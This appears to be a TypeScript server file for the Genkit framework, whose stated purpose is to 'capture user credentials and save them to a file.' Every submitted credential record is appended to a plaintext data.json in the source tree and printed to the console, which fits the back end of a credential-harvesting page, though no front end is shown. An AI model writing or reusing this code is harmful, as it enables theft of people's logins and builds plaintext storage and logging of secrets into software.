'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to a file.
 *
 * - captureCredentials - A function that receives and logs user credentials.
 */

import {ai} from '@/ai/genkit';
import type {CredentialsInput} from '@/ai/types/credentials';
import {CredentialsInputSchema} from '@/ai/types/credentials';
import fs from 'fs/promises';
import path from 'path';

export async function captureCredentials(
  input: CredentialsInput
): Promise<CredentialsInput> {
  return captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CredentialsInputSchema,
  },
  async (input: CredentialsInput) => {
    const dataFilePath = path.join(process.cwd(), 'src', 'ai', 'flows', 'data.json');
    let credentials: CredentialsInput[] = [];

    try {
      const fileContent = await fs.readFile(dataFilePath, 'utf-8');
      if (fileContent) {
        credentials = JSON.parse(fileContent);
      }
    } catch (error: any) {
      if (error.code !== 'ENOENT') {
        // Ignore file not found error, as we'll create it.
        console.error('Error reading data.json:', error);
      }
    }

    credentials.push(input);

    await fs.writeFile(dataFilePath, JSON.stringify(credentials, null, 2));
    
    console.log('Captured Credentials:', input);
    
    return input;
  }
);
